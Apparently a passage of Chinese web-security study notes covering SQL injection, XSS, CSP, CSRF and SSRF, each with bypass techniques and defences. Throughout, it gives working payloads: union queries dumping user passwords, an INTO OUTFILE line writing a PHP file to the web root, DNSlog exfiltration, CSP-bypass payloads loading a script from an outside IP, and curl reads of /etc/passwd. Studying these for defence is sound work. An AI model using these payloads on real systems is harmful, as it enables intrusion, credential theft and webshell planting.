<li>updatexml和extractvalue的局限性：<br>最大长度是32位，查询的长度超过32位就不会显示出来</li>
<li>代码层面：是否把报错信息输出到页面</li>
</ol>
<p><strong>三、布尔盲注</strong></p>
<ol>
<li>概述：只有查询正确或错误两种回显情况，构造逻辑语句，通过判断语句内容的真假回显获取有用信息（与查询成功回显正常，不成功无回显）</li>
<li>常用判断信息：名称长度，逐字符判断名称（可用burp进行爆破）</li>
<li>可以用<code>length</code>来判断数据库名称的长度，<code>substr</code>来逐个判断名称的字符；<code>?id=1&#39; and length(database())=8 --+</code>、<code>?id=1 and substr(database(),1,1)=&#39;s&#39; --+</code></li>
<li>从代码层面判断是否有布尔注入：根据用户传入的参数，只显示正确和错误两种情况，并不返回数据库中的任何信息。<br><strong>四、时间盲注</strong></li>
<li>概述：通过if语句，判断正确时执行sleep，若页面正常时间回显，则判断条件错误，延迟回显，则判断条件正确</li>
<li>语法：<code>if(条件, 正确sleep, 错误返回)</code>、<code>?id=1&#39; and if(length(database())=9,1,sleep(3)) --+</code>、&#96;and if(length(database())&#x3D;8,benchmark(10000,md5(‘a’)),1)</li>
<li>常用判断信息：名称长度，具体字符</li>
<li>指利用<code>sleep()</code>、<code>benchmark()</code>等函数让SQL语句执行时间延长，从而根据回显时间长短来判断是否存在时间盲注漏洞；(<code>benchmark(表达式执行次数，执行的表达式)</code>)</li>
<li>代码层面和布尔注入一样，至少没有过滤<code>sleep()</code>等函数。</li>
</ol>
<p><strong>五、二次注入</strong></p>
<ol>
<li>概述：向数据库中插入带有经过转义的特殊字符的恶意数据（如<code>1\&#39;</code>），而数据库在写数据时将转义字符去掉了；在另一处调用这条数据时，如果没有很好的过滤检测，未经无转义的特殊字符数据就会被取出来，拼接执行sql语句</li>
<li>示例：注册一个带有特殊字符的用户名<code>Dumb&#39; -- -</code>，修改密码再次调用这个用户名时，后面的内容会被注释掉，即成为修改<code>Dumb</code>用户的密码</li>
<li><img src="/./images/1625805245275.png" alt="enter description here">[sql-2]</li>
</ol>
<p><strong>六、堆叠注入</strong></p>
<ol>
<li>概述：通过<code>;</code>连接执行多个sql语句</li>
<li>局限性：可能受到API或者数据库引擎不支持的限制，或者权限不足</li>
<li>缺点：web页面只能返回一条查询语句返回的结果，读取数据时优先使用union注入</li>
<li>条件：能执行多条语句（如：使用PDO执行SQL语句时）</li>
</ol>
<p><strong>七、宽字节注入</strong></p>
<ol>
<li>概述：MYSQL默认的是GBK等宽字节字符集，当我们传入<code>&#39;单引号</code>之类的特殊符号时，会被转义函数（如addslashes()）添加<code>\</code>进行转义；如果输入<code>%df&#39;</code>就会变为<code>%df\&#39;</code>，再遇上GBK编码，变成<code>%df%5c&#39;</code>，而在GBK编码中<code>%df%5c</code>又被认为是构成一个汉字<code>運</code>，所以就相当于没有进行转义，addslashes()等转义函数不起作用。</li>
<li>代码分析：使用了GBK编码，对输入参数进行了转义</li>
</ol>
<p><strong>八、XFF注入</strong></p>
<ol>
<li>概述：X-Forwarded-For简称XFF头，代表客户端的真实IP，可以用过修改XFF头来伪造IP。</li>
<li>判断是否存在XFF注入：构造语句<code>127.0.0.1&#39; and 1=1 #</code>和<code>127.0.0.1&#39; and 1=2 #</code>，如果两个语句返回结果不同，则存在XFF注入</li>
<li>代码分析：在获取IP地址后，将IP地址带入SQL语句查询。</li>
</ol>
<p><strong>九、文件操作</strong></p>
<ol>
<li>load_file(“E:\user.txt”) 读文件</li>
<li><code>outfile</code>写文件 ：<code> &#39;union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;C:\\phpstudy\PHPTutorial\\WWW\\sqli\\Less-7\\2.php&#39;</code><br>dumpfile<br>区别：outfile可以导出多行数据，dumpfile只能导出一行数据；<br> 当写入一个二进制文件时，使用outfile在转义的过程中会破环文件，而dumpfile不会，dumpfile也不会对任何列行进行终止，也不会执行转义处理。</li>
<li><code>update</code> 更新数据 ：<code>update users set password=&#39;admin&#39; where username =&#39;admin&#39;;</code></li>
</ol>
<h3 id="SQL注入的利用"><a href="#SQL注入的利用" class="headerlink" title="SQL注入的利用"></a>SQL注入的利用</h3><ol>
<li>获取数据库信息</li>
<li>在权限足够的情况下写入一句话木马，获取webshell</li>
</ol>
<h3 id="SQL注入绕过方法"><a href="#SQL注入绕过方法" class="headerlink" title="SQL注入绕过方法"></a>SQL注入绕过方法</h3><ol>
<li>注释符绕过：<code>/*xxx*/</code>、<code>-- </code>、<code>#</code></li>
<li>大小写绕过</li>
<li>内联绕过：<code>/*!...*/</code></li>
<li>双写绕过</li>
<li>特殊编码绕过</li>
<li>空格过滤绕过：用<code>/**/</code>、<code>()</code>、<code>%0a</code>、<code>tap</code>、两个空格等代替</li>
<li>逻辑运算符过滤绕过：<code>and = &amp;&amp;</code>，<code>or = ||</code>，<code>xor = |</code>，<code>not = !</code></li>
<li>过滤等号绕过：用<code>like</code>替换<code>=</code>，<code>rlike</code>模糊匹配，大于小于号来限定范围，<code>!&lt;&gt;</code>与<code>=</code>同效果，使用函数、关键字（strcmp()，between）</li>
<li>过滤大小于号绕过：<code>greatest(n1,n2,n3..)</code>返回n中的最大值；strcmp()，in关键字（<code>in(&#39;s&#39;)</code>），between</li>
<li>过滤引号绕过：将参数用十六进制编码就不用带引号，采用编码</li>
<li>过滤逗号绕过：</li>
</ol>
<ul>
<li><code>substr(str from pos for len)</code>代替（在str中从pos个开始读取len长度的子串）</li>
<li><code>join</code>代替，<code>union select * from (select 1)a join (select 2)b join(select 3)c</code>等价于<code>union select 1,2,3</code></li>
<li><code>like</code>代替，<code>select user() like &quot;r%&quot;;</code>等价于<code>select ascii(substr(user(),1,1))=114;</code></li>
<li><code>offset</code>代替，<code>limit 1 offset 2</code>等价于<code>limit 2,1</code></li>
</ul>
<ol start="12">
<li>过滤函数绕过：用其他函数替代</li>
</ol>
<ul>
<li>sleep() &#x3D;&#x3D; benchmark()</li>
<li>ascii() &#x3D;&#x3D; hex() &#x3D;&#x3D; bin()</li>
<li>group_concat() &#x3D;&#x3D; concat_ws()</li>
<li>substr() &#x3D;&#x3D; substring() &#x3D;&#x3D; mid() &#x3D;&#x3D; left() &#x3D;&#x3D; right()</li>
<li>user() &#x3D;&#x3D; @@user</li>
<li>datadir &#x3D;&#x3D; @@datadir</li>
<li>ord() &#x3D;&#x3D; ascii()</li>
</ul>
<p><strong>SQL注入无回显</strong></p>
<ol>
<li>使用DNSlog外带，dnslog日志中会返回我们查询的信息，使用<code>load_file</code>函数，需要root权限，<code>secure_file_priv</code>变量值为空就可以加载任意位置的文件；<br>&#96;load_file(concat(‘\&#39;,(version()),’dnslog地址\111’))</li>
<li>利用时间盲注</li>
</ol>
<p><strong>SQL注入防御方法</strong></p>
<ol>
<li>验证用户输入内容的合法性，过滤掉敏感字符及关键字；客户端和服务端都要验证，避免攻击者通过抓包修改数据来绕过客户端验证；</li>
<li>使用转义函数将一些特殊字符进行转义（在PHP中使用addslashes()等函数进行转义（开启magic_quote_gpc&#x3D;on））</li>
<li>使用预编译：编译sql语句用<code>?</code>占位，当用户输入后将参数替换进预先编译好的sql语句，不用再编译一次，因为sql注入是在编译过程中发生的，所以预编译能起到防御作用。例如Java中使用prepareStatement进行预编译；</li>
<li>不能使用预编译的地方，如表名、列名处，可以将用户的输入用反引号包裹，这样既不会影响 SQL 语句的执行，也避免用户进行恶意拼接；</li>
<li>将报错信息模糊处理，不显示详细错误信息；</li>
<li>在数据库中以加密形式存储数据，如：将用户输入用户名、密码等进行加密处理后，再与数据库中的信息进行比对。</li>
</ol>
<p><strong>SQLmap使用方法</strong><br>语法：<code>python sqlmap.py -u url -D schema_name -T table_name --columns</code><br>参数：</p>
<ul>
<li>–dbs 查询所有数据库</li>
<li>–users 查询所有数据库的用户</li>
<li>–tables 查询表名</li>
<li>–columns 查询列名</li>
<li>–data 带入查询数据</li>
<li>–dump 输出查询内容</li>
<li>–dbms 指定数据库</li>
<li>–count 统计结果条数</li>
<li>–level 测试等级</li>
</ul>
<p><strong>手动查表列名</strong><br>数据库名：<br><code>?id=-1&#39; union select 1,(group_concat(schema_name) from information_schema.schcemata),3 --+</code><br>表名：<br><code>?id=-1&#39; union select 1,(group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;),3 --+</code><br>列名：<br><code>?id=-1&#39; union select 1,(group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;),3 --+</code><br>用户名和密码：<br><code>?id=-1&#39; union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3 --+</code></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a target="_blank" rel="noopener" href="https://www.xf1433.com/4020.html">https://www.xf1433.com/4020.html</a><br><strong>一、概述</strong><br>跨站脚本攻击（重点在于脚本的执行）。攻击者向存在漏洞的网站页面注入恶意代码，可被浏览器执行，造成攻击。是由于对用户输入的内容过滤不足而产生的。</p>
<p><strong>二、反射型</strong></p>
<ol>
<li>原理：经过后端，不经过数据库，攻击是一次性的，受害者点击恶意连接，触发xss脚本。</li>
<li>常见位置：网站搜索栏，用户登录口等地方，用来窃取客户端Cookies或钓鱼欺骗</li>
</ol>
<p><em><strong>攻击步骤</strong></em><br>1.攻击者构造出特殊的URL，其中包含恶意代码.<br>2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。</p>
<p><strong>三、存储型</strong></p>
<ol>
<li>原理：攻击者先将恶意代码通过一定手段储存到数据库中，只要受害者浏览该网站，恶意代码就会被执行。恶意代码一直存在。</li>
<li>常见位置：网站留言，评论区，博客日志交互处。</li>
</ol>
<p><em><strong>攻击步骤</strong></em><br>1.攻击者将恶意代码提交到目标网站的数据库中。<br>2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.</p>
<p><em><strong>防御</strong></em><br>服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;<br>前端接收到服务器传递过来的数据，在展示到页面前，先进行转义&#x2F;过滤;</p>
<p><strong>四、DOM型</strong></p>
<ol>
<li>DOM型是一种基于DOM文档对象模型的一种漏洞，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中数据并在本地执行</li>
<li>原理：实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面。</li>
<li>好处：构造的URL参数不用发送到服务端，可以达到绕过WAF、躲避服务端检测的效果。</li>
</ol>
<p><em><strong>攻击步骤</strong></em></p>
<ol>
<li>攻击者构造出特殊的URL，其中包含恶意代码。</li>
<li>用户点击这个URL后，浏览器会处理这个响应，执行恶意代码，从而改变DOM结构</li>
<li>根据代码内容可以窃取用户数据发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.</li>
</ol>
<p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞。（不与服务端交互）<br><img src="/./images/1645877622741.png" alt="enter description here">[xss-1]</p>
<p><em><strong>DOM型防护策略</strong></em><br>当网页输出到<code>&lt;script&gt;</code>时，先用encodeForJavaScript对它编码，然后再判断<code>document.write()</code>输出的位置，如果输出到HTML页面，则使用encodeForHTML编一次码，如果是输出到Javascript，则使用encodeForJavaScript编一次码。</p>
<p><strong>XSS蠕虫：</strong><br>XSS蠕虫一般发生在需要在用户之间发生交互行为的地方，一般同时结合了反射型和存储型。</p>
<p><em><strong>XSS蠕虫与传统蠕虫相比的特点：</strong></em></p>
<ul>
<li>攻击载体不同。传统蠕虫的攻击与传播是在用户结点之间，容易引发网络阻塞；XSS蠕虫的攻击与传播一般是在用户节点与网络节点之间。</li>
<li>攻击方式不同。传统蠕虫多采用漏洞攻击，利用缓冲区溢出进行传播；XSS蠕虫则是利用社会工程学在用户和网站之间传播。</li>
<li>攻击环境不同。传统蠕虫是寻找有漏洞的并且容易感染的节点；XSS蠕虫跟更着重于在社交网络上传播。</li>
</ul>
<p><em><strong>XSS蠕虫传播过程：</strong></em><br>攻击者在web页面植入恶意的HTML代码，诱惑用户点击攻击者构造的恶意链接，用户点击来链接后就会备感染，然后又会自动向其他好友发送链接，通过一个人传人的模式来造成大面积的攻击。</p>
<p><em><strong>影响因素：</strong></em></p>
<ul>
<li>利用社会工程学使得用户不会对恶意链接产生警惕；</li>
<li>用户的安全意识不高，对恶意链接没有辨别能力；</li>
<li>社交环境活跃度较高，人群大，传播广；</li>
</ul>
<h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><ol>
<li>编码绕过：常见的有JS编码、HTML实体编码、URL编码</li>
<li>大小写绕过</li>
<li>双写绕过</li>
<li>替换绕过：<br>alert用prompt，confirm等代替；<br><code>()</code>用双反引号代替；<br>空格用<code>%0a</code>，<code>%0d</code>，<code>/**/</code>代替；</li>
<li>%00截断</li>
<li>on事件绕过</li>
<li>有时候还可以利用浏览器的容错性绕过</li>
<li>标签闭合绕过</li>
<li>@符号绕过URL限制（在url后面添加@+路径，访问的就是@符号后面的地址）</li>
<li>前端过滤：burp改包绕过</li>
<li>注释干扰绕过：<code>&lt;scri&lt;!--test--&gt; pt&gt; alert(1);&lt;/scr&lt;!--test--&gt; ipt&gt;</code></li>
</ol>
<p><strong>XSS防御方法</strong><br>对于每一个输入，在客户端和服务端都需要进行各种验证，判断字符是否合法，长度是否合法，格式是否正确等；尽量使用白名单。</p>
<ol>
<li>对输出进行编码：对所有要动态输出到页面的内容，通通进行相关的编码和转义。</li>
<li>面对javascript事件，将特殊字符进行转义（<code>\</code>转成<code>\\</code>，<code>/</code>转成<code>\/</code>，<code>;</code>转成<code>；</code>）</li>
<li>确保<code>&lt;script&gt;</code> <code>&lt;style&gt;</code> <code>&lt;img&gt;</code>等标签的src和href属性的值必须以<code>http://</code>开头，白名单方式，不能有十进制和十六进制的编码字符。</li>
<li>对cookie设置HttpOnly，客户端脚本就不能访问到cookie了。</li>
<li>利用 CSP限制浏览器只加载我们指定来源的资源，避免加载攻击者指定来源的资源，从而减轻受到XSS攻击的风险。</li>
<li>对输入进行检查</li>
</ol>
<h2 id="CSP-内容安全策略"><a href="#CSP-内容安全策略" class="headerlink" title="CSP(内容安全策略)"></a>CSP(内容安全策略)</h2><p><strong>一、概述</strong><br>  用于帮助检测和缓和某些类型的攻击，包括XSS和数据注入攻击。引入一些相当严格的的策略，会使扩展程序在默认情况下更安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。简单来说就是我们的网站只接受我们指定的请求资源。<br>  CSP实质上就是白名单制度，明确告诉客户端，哪些外部资源可以加载和执行。它的实现和执行全部由浏览器完成，开发者只需提供配置。大大增强了网页的安全性，攻击者即使发现了漏洞，也没法注入脚本。<br><strong>二、CSP应用</strong></p>
<ol>
<li>在http头中添加Content-Security-Policy字段来指定<code>策略指令</code>和<code>内容源</code>，如下：<br><code>Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39;</code></li>
<li>由HTML的Meta标签指定，不过这种方式存在缺陷，每个页面都需要添加，而且不能对限制的域名进行上报，如下：<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39; *.xx.com *.xx.cn &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;&quot;&gt;</code></li>
</ol>
<p>一个CSP头由多组CSP策略组成，每组策略包含一个策略指令和一个内容源列表。</p>
<p><strong>常用指令</strong><br><img src="/./images/1647177523472.png" alt="enter description here">[CSP-1]<br><strong>三、内容源</strong></p>
<ol>
<li><p><strong>源列表：</strong> 源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。</p>
</li>
<li><p><strong>关键字：</strong></p>
</li>
</ol>
<ul>
<li><code>none</code>:代表空集；即不匹配任何 URL。两侧单引号是必须的。</li>
<li><code>self</code>:代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li>
<li><code>unsafe-inline</code>:允许使用内联资源，如内联的<code>&lt;script&gt;</code>元素、javascript: URL、内联的事件处理函数和内联的<code>&lt;style&gt;</code>元素，两侧单引号是必须的。</li>
<li><code>unsafe-eval</code>:允许使用<code>eval()</code>等通过字符串创建代码的方法。两侧单引号是必须的。</li>
</ul>
<ol start="3">
<li><strong>数据：</strong></li>
</ol>
<ul>
<li>data：允许data:URL作为内容来源；</li>
<li>mediastream：允许mediastream:URI作为内容来源。</li>
</ul>
<h3 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h3><ol>
<li>绕过<code>default-src &#39;none&#39;</code>(不允许加载任何内容)：<br>可以使用meta标签实现跳转，通过下面payload可跳转至指定网站（未添加CSP），执行该网站下的脚本；<br><code>?blckder02=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://47.100.93.13/xss.php&quot; &gt;</code></li>
<li>绕过default-src ‘none’ ‘unsafe-inline’：<br>大部分CSP不会限制跳转，可以通过跳转来获取并保存cookie；<br>可以用 <code>window.location.href</code>、<code>window.location</code>、<code>window.open</code> 构造paload进行网页跳转</li>
<li>绕过<code>xx-src *</code>：<br><code>frame-src</code>设置为<code>*</code>，可以加载任意<code>iframe</code>来源的url；(使用iframe标签，不用<code>&lt;script&gt;</code>标签)，可以远程加载script代码。</li>
<li>利用浏览器补全绕过<code>script &#39;nonce-xxx&#39;</code>：<br>（自动补全匹配引号）<br>如下payload：<br><code>?blckder02=&lt;p&gt;&lt;script src=&quot;http://47.100.93.13/xss.js&quot; a=&quot;&lt;/p&gt;&lt;script type=&quot;text/javascript&quot; nonce=&quot;xxx&quot;&gt;document.write(&quot;blckder02&quot;)&lt;/script&gt;</code><br>利用浏览器补全的功能，在插入点插入script标签的同时，添加a&#x3D;”，用这里的双引号来闭合后面的script标签中第一个属性的前双引号，从而使这两个双引号之间的内容失效；<br>所以nonce属性就被劫持到了插入点的script标签中，首尾两个script标签闭合完整，可以正常执行js代码；</li>
<li>利用link标签绕过xx-src self：<br>CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。（用<code>link</code>标签构造payload）</li>
<li>利用Gadgets和strict-dynamic&#x2F;unsafe-eval绕过：<br>即重用Gadgets代码来绕过CSP；<br>假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：<br><code>&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></li>
<li>利用iframe绕过：</li>
</ol>
<ul>
<li>页面A与页面B同源，页面A有CSP限制而页面B没有；可以在A页面加载B页面来绕过CSP；（用iframe标签 src 构造payload加载B页面）</li>
<li>利用Chrome特性禁用过滤XSS向量的库</li>
</ul>
<ol start="7">
<li>利用浏览器缓存绕过script nonce：</li>
</ol>
<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><p><strong>一、作用</strong><br>  攻击者盗用了你的身份，伪装成你发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。<br>   主要存在情况就是受害者在某一网站上的登录未过期的情况下，点击了攻击者制作的钓鱼链接，然后攻击者获取到了受害者的cookie等身份信息，就可以冒充受害者去访问这个网站，操作受害者的账号内容。<br><strong>二、满足条件</strong></p>
<ul>
<li>目标用户语句登录的网站，能够执行网站的功能</li>
<li>目标用户访问了攻击者构造的URL</li>
</ul>
<p><strong>三、原理</strong><br>服务器无法准确判断当前请求是否是合法用户的自定义操作；<br>在受害者在某一网站上的登录未过期的情况下，攻击者可以冒充受害者去访问这个网站，操作受害者的账户。</p>
<p><strong>四、CSRF常见攻击类型</strong></p>
<ol>
<li>GET类型<br>构造一个恶意页面，当受害者访问这个页面时，会自动向我们指定的网站发送一次HTTP请求，请求的内容直接写在URL中的；（完成一次跨域请求）</li>
<li>POST类型<br>构造一个恶意页面，设置一个隐藏表单，当受害者访问这个页面时，表单就会自动提交，完成恶意操作；</li>
<li>链接类型的CSRF</li>
</ol>
<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><ol>
<li>验证 HTTP Referer 字段：如果Referer不是来自信任网站或者是空白，就有可能是CSRF攻击。（可绕过）</li>
<li>在请求地址中添加 token 并验证：为了防止伪造用户的请求，在HTTP请求中以参数的形式加入一个随机产生的token，并在服务端验证是否有token和token是否正确。</li>
<li>在 HTTP 头中自定义属性并验证</li>
<li>二次验证</li>
<li>验证码防御</li>
<li>尽量使用POST</li>
</ol>
<p><strong>CSRF绕过：</strong></p>
<ol>
<li>绕过Referer</li>
</ol>
<ul>
<li>如果只检测了Referer是否合法，并没有排除Referer为空的情况，就可以使用空Referer来绕过；（利用其他协议，比如data、file等；如果目标是http的站点，那么从https的站点向http站点跳转是不含Referer的）</li>
<li>如果目标站点只是检测Referer是否包含某个关键词，如a.com，那么我们就可以构造如<code>poc.html?a.com</code>来绕过；</li>
<li>如果Referer必须来自某个域，如b.com，那么我们可以寻找它的子域名，把poc发布到子域下，受害者点击连接，就会由子域向b.com发起请求。</li>
</ul>
<ol start="2">
<li>绕过token</li>
</ol>
<ul>
<li>使用JSONP劫持token（构造恶意连接，在里写入获取token的代码，然后用户会向目标网站发送请求，从而成功获取到token）</li>
</ul>
<p><strong>token存放在哪里：</strong></p>
<ol>
<li>存放在local Storage中，每次调用接口的时候都把它当成一个字段传给后台；</li>
<li>放在表单中随表单提交</li>
</ol>
<p><strong>CSRF修补：</strong><br>  如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。<br>  一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交。</p>
<p><strong>CSRF代码分析</strong><br>  要从代码上观察是否存在CSRF漏洞，可以看是否验证了用户是否成功登录网站，然后在用户已登录的情况下能够进行哪些操作，完全信任用户，没有对用户的操作进行其他安全限制。</p>
<p><strong>如何检测CSRF：</strong></p>
<ol>
<li>先抓取一个正常请求的数据包，查看里面是否有token或Referer，如果有的话就把token和Referer删掉，再发送，看是否会报错，不报错的话就可能存在CSRF。</li>
<li>修改Referer的值，查看是否报错（和绕过referer的步骤一样）</li>
</ol>
<p><strong>token、cookie、session：</strong><br>session：<br>  当第一次访问网站时，会服务端会生成一个session和sessionid，sessionid会返回给客户端，保存在cookie中，session会保存在服务端的内存中。</p>
<p>cookie：<br>  cookie存放在客户端，可以用来保存服务端返回的一些信息（sessionid、tooken），每一次请求都会携带cookie，服务端就可以通过cookie中的信息来判别这次请求是否合法。（大小为4k）</p>
<p>token：<br>  token是由服务端生成的一个字符串（存放在服务端的数据库中），用户第一次登录一个网站后，token会返回给客户端，下次发起请求就只需要携带上这个token。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684293.html">https://www.cnblogs.com/linuxsec/articles/12684293.html</a><br><strong>一、SSRF漏洞定义</strong><br>  SSRF（Server-Side Request Forgery），全程“服务器端请求伪造”。是一种由攻击者构造形成，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。<br>  只要是会向其他远程服务器发起请求的地方都可能存在SSRF。<br><strong>二、SSRF漏洞原理</strong><br>  SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取资源的功能，但没有对目标地址做过滤与限制。<br>  客户端只能通过服务端来获取内网资源，如果服务端对客户端发送的请求没有进行筛查或过滤等限制，则可能形成ssrf漏洞，从而可以直接从外网客户端访问到内网资源，获取敏感信息。</p>
<p><strong>三、SSRF利用</strong><br>*<strong>主要利用方式：</strong></p>
<ul>
<li>对外网、服务器所在的内网、本地进行端口扫描，获取banner信息；</li>
<li>测试运行在内网或本地的应用程序；</li>
<li>利用file协议读取本地文件等；</li>
<li>对内网web应用进行指纹识别，通过访问默认文件实现 。</li>
<li>攻击内外网的web应用。sql注入、struct2、redis等。</li>
</ul>
<p><em><strong>常用协议：</strong></em></p>
<ol>
<li>file：读取任意文件(<code>curl -v &#39;file:///etc/passwd&#39;</code>)</li>
<li>http：向目标发送get请求，可以探测内网</li>
<li>dict：使用dict协议可以探测端口服务(<code>curl -v &#39;dict://127.0.0.1:80&#39;</code>)（获取一些信息，向服务器端口执行命令（6389 redis），只能一条一条执行）</li>
<li>gopher：可以使用gopher协议构造post请求来攻击内网应用（可以先截获get请求包和post请求包，再构造成符合gopher协议的请求；需要指定端口，指定post方法，回车换行符用%0d %0a替换，传输数据的第一个字符会被吃掉，所以在数据前面要添加一个无用字符；可用于反弹shell）<br><em><strong>如何利用SSRF除探测主机外进一步进行攻击？</strong></em></li>
</ol>
<p><strong>四、SSRF漏洞常见位置</strong></p>
<ol>
<li>远程图片下载</li>
<li>加载远程文件</li>
<li>离线下载</li>
<li>远程摄像头</li>
<li>网页翻译</li>
<li>转码(手机自适应)</li>
<li>weblogic配置不当，天生ssrf漏洞</li>
<li>从URL关键字中寻找</li>
</ol>
<p><strong>五、SSRF漏洞验证</strong></p>
<ol>
<li><p>先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是<code>http://www.baidu.com/img/bd_logo1.png</code>，说明不存在SSRF漏洞。</p>
</li>
<li><p>可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含<code>http://www.baidu.com/img/bd_logo1.png</code>这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</p>
</li>
<li><p>在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</p>
</li>
<li><p>DNSlog检测：构造请求包，向dnslog发送请求，看dnslog上是否有解析记录，如果有，则存在SSRF漏洞</p>
</li>
</ol>
<h3 id="SSRF绕过方法"><a href="#SSRF绕过方法" class="headerlink" title="SSRF绕过方法"></a>SSRF绕过方法</h3><ol>
<li>@　　<a target="_blank" rel="noopener" href="http://abc.com@127.0.0.1,与http/?/127.0.0.1%E8%AF%B7%E6%B1%82%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84">http://abc.com@127.0.0.1，与http?/127.0.0.1请求是相同的</a></li>
<li>添加端口号　　<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></li>
<li>短地址　　　　<a target="_blank" rel="noopener" href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></li>
<li>特殊域名(将域名指向任意IP)　 xxxxx.127.0.0.1.xip.io -&gt; 127.0.0.1</li>
<li>ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制）</li>
<li>非HTTP协议</li>
<li>DNS Rebinding</li>
<li>302跳转绕过</li>
<li>使用句号代替点号：127。0。0。1  -&gt; 127.0.0.1</li>
</ol>
<p><strong>SSRF限制绕过技巧：</strong></p>
<ol>
<li>限制为<a target="_blank" rel="noopener" href="http://www.xxx.com域名/">http://www.xxx.com域名</a></li>
</ol>
<ul>
<li>使用@绕过：<code>http://www.xxx.com@www.yyy.com</code></li>
</ul>
<ol start="2">
<li>限制请求IP不为内网地址</li>
</ol>
<ul>
<li>采用短网址绕过</li>
<li>采用特殊域名绕过</li>
<li>采用进制转换</li>
</ul>
<ol start="3">
<li>限制请求只为http&#x2F;https协议</li>
</ol>
<ul>
<li>采用302跳转</li>
<li>采用短网址</li>
<li>可以使用 DNS 重绑定结合TLS Session来绕过：</li>
</ul>
<ol>
<li>TLS 有会话复用机制，当经过一次会话验证后，会保存 Session ID，下次会话客户端携带 Session ID，就能避证书认证和密钥生成等过程；</li>
<li>可以把存在 SSRF 漏洞的服务器理解为客户端，向攻击者的服务器发起 HTTPS 请求，会进行 DNS 解析，对解析后的 IP 进行校验，确认合法后再正式请求；</li>
<li>攻击者的服务器响应请求，并且设置 TTL 为0， 返回一个构造的恶意 Session ID 和跳转指令，客户端收到响应后，保存 Session ID，并且发生跳转；</li>
<li>因为 TTL 为 0 ，所以会再次进行 DNS 解析，通过 DNS 重绑定解析到另一个 IP 地址，可以是内网地址；因为域名没有变，所以还是携带之前保存的 Session ID 与新地址进行通信，这样一来就把恶意的 Session ID 发送到了内网IP地址，从而通过 Session ID 中的恶意代码达到我们的目的。</li>
</ol>
<p><strong>防御、修复方案：</strong></p>
<ol>
<li>统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</li>
<li>限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等</li>
<li>去除 url 中的特殊字符</li>
<li>黑名单内网IP。</li>
<li>进行 DNS 解析后，将请求地址改为解析后的 IP 地址，避免 DNS 重绑定；</li>
<li>限制跳转操作；（若发生跳转则要重新校验目标地址）</li>
<li>禁用不需要的协议，仅允许HTTP和HTTPS(禁止file,dict等协议读取文件)</li>
</ol>
<p><strong>XXE与SSRF的区别？</strong></p>
<p><strong>CSRF与SSRF的区别？</strong></p>
